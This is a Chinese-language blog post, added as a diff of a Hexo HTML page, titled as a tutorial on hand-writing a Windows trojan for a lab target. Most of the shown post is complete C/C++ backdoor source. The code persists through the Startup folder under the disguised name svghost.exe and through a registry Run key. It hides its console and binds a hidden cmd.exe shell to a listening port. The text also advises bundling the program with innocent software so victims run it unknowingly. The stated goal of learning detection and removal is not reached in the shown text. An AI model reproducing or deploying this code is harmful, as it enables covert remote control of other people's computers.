@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32X32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16X16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="目的使用C++实现一个简单的木马，实现木马的远程控制功能，能够开机自启动和伪装或隐藏，最后通过清除本木马，掌握常规的木马排查和查杀方法。 工具：vc++6.0攻击机：win10(ip随机)   靶机：192.168.1.129">
+<meta property="og:type" content="article">
+<meta property="og:title" content="#2 手动编写windows木马">
+<meta property="og:url" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="陆♥柒">
+<meta property="og:description" content="目的使用C++实现一个简单的木马，实现木马的远程控制功能，能够开机自启动和伪装或隐藏，最后通过清除本木马，掌握常规的木马排查和查杀方法。 工具：vc++6.0攻击机：win10(ip随机)   靶机：192.168.1.129">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-0.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-1.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-2.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-3.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-4.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-5.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-6.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-7.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-8.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-9.png">
+<meta property="article:published_time" content="2020-05-30T10:13:46.000Z">
+<meta property="article:modified_time" content="2020-05-30T11:10:51.105Z">
+<meta property="article:author" content="KinniSoy">
+<meta property="article:tag" content="木马">
+<meta property="article:tag" content="windows编程">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/%5Cimages%5Cpasted-0.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>#2 手动编写windows木马 | 陆♥柒</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">陆♥柒</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">2</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/30/2-%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99windows%E6%9C%A8%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="KinniSoy">
+      <meta itemprop="description" content="層樓終究誤少年，自由早晚亂餘生。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="陆♥柒">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          #2 手动编写windows木马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-30 18:13:46 / 修改时间：19:10:51" itemprop="dateCreated datePublished" datetime="2020-05-30T18:13:46+08:00">2020-05-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9C%A8%E9%A9%AC/" itemprop="url" rel="index"><span itemprop="name">木马</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>使用C++实现一个简单的木马，实现木马的远程控制功能，能够开机自启动和伪装或隐藏，最后通过清除本木马，掌握常规的木马排查和查杀方法。</p>
+<p>工具：vc++6.0<br>攻击机：win10(ip随机)   靶机：192.168.1.129</p>
+<a id="more"></a>
+
+
+<h4 id="一、木马是什么？"><a href="#一、木马是什么？" class="headerlink" title="一、木马是什么？"></a>一、木马是什么？</h4><p>这是一个老生常谈的问题，木马（Trojan）这个名字来源于古希腊传说(荷马史诗中木马计的故事，Trojan一词的本意是特洛伊的，即代指特洛伊木马，也就是木马计的故事)。</p>
+<h4 id="二、木马隐藏技术"><a href="#二、木马隐藏技术" class="headerlink" title="二、木马隐藏技术"></a>二、木马隐藏技术</h4><p>木马会想尽一切办法隐藏自己，主要途径有：在<strong>任务栏中隐藏</strong>自己，这是最基本的办法。只要把Form的Visible属性设为False，ShowInTaskBar设为False，程序运行时就不会出现在任务栏中了（MFC编程）。在任务管理器中隐形：将程序<strong>设为“系统服务”</strong>可以很轻松地伪装自己。当然它也会悄无声息地启动，黑客当然不会指望用户每次启动后点击“木马”图标来运行服务端，“木马”会在每次用户启动时自动装载。Windows系统启动时自动加载应用程序的方法，“木马”都会用上，如<strong>：启动组、Win.ini、System.ini、注册表</strong>等都是“木马”藏身的好地方。木马与计算机网络中常常要用到的远程控制软件有些相似，但由于远程控制软件是“善意”的控制，因此通常不具有隐蔽性；“木马”则完全相反，木马要达到的是“偷窃”性的远程控制，如果没有很强的隐蔽性的话，那就是“毫无价值”的。</p>
+<h4 id="三、木马程序原理："><a href="#三、木马程序原理：" class="headerlink" title="三、木马程序原理："></a>三、木马程序原理：</h4><p>木马病毒的工作原理：一个完整的特洛伊木马套装程序含了两部分：服务端（服务器部分）和客户端（控制器部分）。植入对方电脑的是服务端，而黑客正是利用客户端进入运行了服务端的电脑。运行了木马程序的服务端以后，会产生一个有着容易迷惑用户的名称的进程，暗中打开端口，向指定地点发送数据（如网络游戏的密码，即时通信软件密码和用户上网密码等），黑客甚至可以利用这些打开的端口进入电脑系统。</p>
+<h4 id="四、编写后门型木马："><a href="#四、编写后门型木马：" class="headerlink" title="四、编写后门型木马："></a>四、编写后门型木马：</h4><p>编写一个反弹shell的木马，能够伪装成其他应用程序（扫雷游戏，或者表白代码等伪装程序），点击运行后能够打开特定的端口（或可使用端口复用技术，更适合与服务器），等待客户端连接，客户端使用telnet后，便可反弹拿到shell，然后为所欲为（创建新的账号密码，远程桌面连接等）。</p>
+<p>木马能够实现开机自启动，任务管理器中在应用程序一栏消失，在进程一栏中伪装成其他进程。</p>
+<h5 id="1-木马的功能模块图"><a href="#1-木马的功能模块图" class="headerlink" title="1.木马的功能模块图"></a>1.木马的功能模块图</h5><p><img src="%5Cimages%5Cpasted-0.png" alt="upload successful"></p>
+<h5 id="2-代码实现各个部分"><a href="#2-代码实现各个部分" class="headerlink" title="2.代码实现各个部分"></a>2.代码实现各个部分</h5><h6 id="开机自启动"><a href="#开机自启动" class="headerlink" title="-开机自启动"></a>-开机自启动</h6><p>windwos有一个自启动文件夹。在 系统启动时会自动运行开始-&gt;启动子菜单中的所有项目<br><img src="%5Cimages%5Cpasted-1.png" alt="upload successful"><br>注意：在Documents and Settings文件下有多个文件夹。</p>
+<p>Administrator文件夹下的是对当前用户的专有账户生效</p>
+<p>All Users文件下是对所有用户生效</p>
+<p>所以一般为了方便我们都放在All Users文件下</p>
+<p><strong>要想实现它，我这里先介绍两个函数</strong>：</p>
+<p>1）UINT GetSystemDirectory()函数</p>
+<p>UINT GetSystemDirectory(LPTSTR lpBuffer,UINT uSize);</p>
+<p>这个函数的参数 lpBuffer会返回系统路径，我们提取前面两位就是就可以得到系统分区，例如“C:”</p>
+<p>2）DWORD GetModuleFileName()函数</p>
+<p>DWORD GetModuleFileName(HMODULE hModule,LPTSTR lpFilename,DWORD nSize);</p>
+<p>这个函数是返回我们程序自身的完整路径</p>
+<p>完整代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> FileName[MAX_PATH];<span class="comment">//存储程序自身的绝对路径</span></span><br><span class="line">	<span class="keyword">char</span> TempPath[MAX_PATH];<span class="comment">//存储系统存放路径，主要获取系统盘盘符</span></span><br><span class="line">	<span class="keyword">char</span> TempBuffer[MAX_PATH];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>,FileName,<span class="keyword">sizeof</span>(FileName));</span><br><span class="line">	GetSystemDirectory(TempPath,<span class="keyword">sizeof</span>(TempPath));</span><br><span class="line">	<span class="built_in">sprintf</span>(TempBuffer,<span class="string">"%c%c\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\torjan.exe"</span>,TempPath[<span class="number">0</span>],TempPath[<span class="number">1</span>]);</span><br><span class="line">	CopyFile(FileName,TempBuffer,TRUE);  <span class="comment">//将程序复制到启动文件夹中</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="将自己加入注册表启动项"><a href="#将自己加入注册表启动项" class="headerlink" title="-将自己加入注册表启动项"></a>-将自己加入注册表启动项</h6><p>自启动注册表路径有许多，大家可以自己了解一下，最常用的有：</p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p>
+<p>这里我们选择第一个，来编写代码，我们用到的主要函数只有一个：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///写入注册表///</span></span><br><span class="line">GetPrivateProfileStringA(<span class="string">"Main"</span>, <span class="string">"KeyName"</span>, <span class="string">"kinni"</span>, key_name, <span class="keyword">sizeof</span>(key_name), <span class="string">".\\config.ini"</span>);<span class="comment">//键</span></span><br><span class="line"></span><br><span class="line">GetPrivateProfileStringA(<span class="string">"Main"</span>,<span class="string">"ProcessPath"</span>,FileName,process_path,<span class="keyword">sizeof</span>(process_path), <span class="string">".\\config.ini"</span>);<span class="comment">//值</span></span><br></pre></td></tr></table></figure>
+
+<p>我们分别设置了注册表的键和值，键为:kinni，值为FileName，FileName为木马文件的绝对路径</p>
+<h6 id="开启端口"><a href="#开启端口" class="headerlink" title="-开启端口"></a>-开启端口</h6><p>主要的办法是：建立CSocket开始，然后绑定端口999，接下来监听这个端口，然后接收来自客户端的命令，最后关闭这个CSocket。这是一个比较简单的正向连接后门程序。这个程序之所以说比较简单，系统重启这个木马就会被清除了。</p>
+<p>创建socket连接的代码比较简单，大家都会，百度一大堆，就不再解释。</p>
+<p>先说个小技巧：因为我们写的cmd木马，整个过程我们都不需要显示出cmd的黑窗窗，所以我们可以把cmd窗口直接屏蔽掉，使用：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置链接器选项</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>因为我们最后要反弹本地shell给客户端，所以我们要先拿到本地cmd.exe的路径。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取CMD路径</span></span><br><span class="line">	GetEnvironmentVariable(<span class="string">"COMSPEC"</span>, szCMDPath, <span class="keyword">sizeof</span>(szCMDPath));</span><br><span class="line"><span class="comment">//COMSPEC是代表cmd，获取更多环境变量可以查看一下本函数的更多参数</span></span><br></pre></td></tr></table></figure>
+
+<p>我们将所有代码整合一下，得到完整代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)</span></span><br><span class="line"><span class="comment">//设置连接器选项</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MasterPort 999 <span class="comment">//定义监听端口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_telnet</span><span class="params">()</span></span>&#123;</span><br><span class="line">	WSADATA WSADa;<span class="comment">//用来存储被WSAStartup函数调用后返回的win sockets数据</span></span><br><span class="line">	sockaddr_in SockAddrin;</span><br><span class="line">	SOCKET CSocket, SSocket;</span><br><span class="line">	<span class="keyword">int</span> AddrSize;</span><br><span class="line">	PROCESS_INFORMATION Processinfo;</span><br><span class="line">	STARTUPINFO Startupinfo;</span><br><span class="line">	<span class="keyword">char</span> szCMDPath[<span class="number">255</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//配内存资源，初始化数据</span></span><br><span class="line">	ZeroMemory(&amp;Processinfo, <span class="keyword">sizeof</span>(PROCESS_INFORMATION));</span><br><span class="line">	ZeroMemory(&amp;Startupinfo, <span class="keyword">sizeof</span>(STARTUPINFO));</span><br><span class="line">	ZeroMemory(&amp;WSADa, <span class="keyword">sizeof</span>(WSADATA));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取CMD路径</span></span><br><span class="line">	GetEnvironmentVariable(<span class="string">"COMSPEC"</span>, szCMDPath, <span class="keyword">sizeof</span>(szCMDPath));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//加载ws2_32.dll</span></span><br><span class="line">	WSAStartup(<span class="number">0x202</span>, &amp;WSADa);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置本地信息和绑定协议，建立socket</span></span><br><span class="line">	SockAddrin.sin_family = AF_INET;</span><br><span class="line">	SockAddrin.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	SockAddrin.sin_port = htons(MasterPort);</span><br><span class="line">	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置绑定断端口999</span></span><br><span class="line">	bind(CSocket, (sockaddr*)&amp;SockAddrin, <span class="keyword">sizeof</span>(SockAddrin));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置服务器监听端口</span></span><br><span class="line">	<span class="built_in">listen</span>(CSocket, <span class="number">1</span>);</span><br><span class="line">	AddrSize = <span class="keyword">sizeof</span>(SockAddrin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//开始连接远程服务器，并配置隐藏窗口结构体</span></span><br><span class="line">	SSocket = accept(CSocket, (sockaddr*)&amp;SockAddrin, &amp;AddrSize);</span><br><span class="line">	Startupinfo.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">	Startupinfo.wShowWindow = SW_HIDE;</span><br><span class="line">	Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;</span><br><span class="line">	Startupinfo.hStdInput = (HANDLE)SSocket;</span><br><span class="line">	Startupinfo.hStdOutput = (HANDLE)SSocket;</span><br><span class="line">	Startupinfo.hStdError = (HANDLE)SSocket;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建匿名管道</span></span><br><span class="line">	CreateProcess(<span class="literal">NULL</span>, szCMDPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;Startupinfo, &amp;Processinfo);</span><br><span class="line">	WaitForSingleObject(Processinfo.hProcess, INFINITE);</span><br><span class="line">	CloseHandle(Processinfo.hProcess);</span><br><span class="line">	CloseHandle(Processinfo.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关闭进程句柄</span></span><br><span class="line">	closesocket(CSocket);</span><br><span class="line">	closesocket(SSocket);</span><br><span class="line">	WSACleanup();</span><br><span class="line">    <span class="comment">//关闭连接卸载ws2_32.dll</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regedit</span><span class="params">(HKEY key, <span class="keyword">const</span> <span class="keyword">char</span>* reg_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hkResult;  </span><br><span class="line">	<span class="keyword">int</span> ret=RegOpenKeyEx(key, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkResult);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	ret=RegSetValueEx(hkResult, key_name, <span class="number">0</span>, REG_EXPAND_SZ, (CONST BYTE*)key_value, <span class="number">75</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(ret==<span class="number">0</span>)</span><br><span class="line">	&#123;  </span><br><span class="line">		RegCloseKey(hkResult);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;  </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;  </span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">autopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* process_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line">	<span class="keyword">return</span> regedit(HKEY_LOCAL_MACHINE, reg_name, key_name, process_path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> key_name[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">char</span> process_path[<span class="number">1024</span>];</span><br><span class="line">	<span class="comment">///写入启动文件夹////</span></span><br><span class="line">	<span class="keyword">char</span> FileName[MAX_PATH];<span class="comment">//存储程序自身的绝对路径</span></span><br><span class="line">	<span class="keyword">char</span> TempPath[MAX_PATH];<span class="comment">//存储系统存放路径，主要获取系统盘盘符</span></span><br><span class="line">	<span class="keyword">char</span> TempBuffer[MAX_PATH];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>,FileName,<span class="keyword">sizeof</span>(FileName));</span><br><span class="line">	GetSystemDirectory(TempPath,<span class="keyword">sizeof</span>(TempPath));</span><br><span class="line">	<span class="built_in">sprintf</span>(TempBuffer,<span class="string">"%c%c\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\svghost.exe"</span>,TempPath[<span class="number">0</span>],TempPath[<span class="number">1</span>]);</span><br><span class="line">	CopyFile(FileName,TempBuffer,TRUE);  <span class="comment">//将程序复制到启动文件夹中</span></span><br><span class="line">	<span class="comment">///写入注册表///</span></span><br><span class="line">	GetPrivateProfileStringA(<span class="string">"Main"</span>, <span class="string">"KeyName"</span>, <span class="string">"kinni"</span>, key_name,  <span class="keyword">sizeof</span>(key_name), <span class="string">".\\config.ini"</span>);</span><br><span class="line">	GetPrivateProfileStringA(<span class="string">"Main"</span>, <span class="string">"ProcessPath"</span>, <span class="string">"C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\svghost.exe"</span>, process_path,  <span class="keyword">sizeof</span>(process_path), <span class="string">".\\config.ini"</span>);	</span><br><span class="line">	<span class="keyword">int</span> ret = autopen(key_name, process_path);</span><br><span class="line">	open_telnet();<span class="comment">//远程telnet	</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="文件伪装"><a href="#文件伪装" class="headerlink" title="-文件伪装"></a>-文件伪装</h6><p>如上，我们代码编译运行后，得到一个exe文件，但是我们隐藏了命令行窗口，所以点击运行后，不会有任何反应。</p>
+<p>但是谁都不会傻到直接运行这么一个什么都没有的代码，我们要跟其他的程序，绑在一起，偷偷执行，让靶机用户不知情。</p>
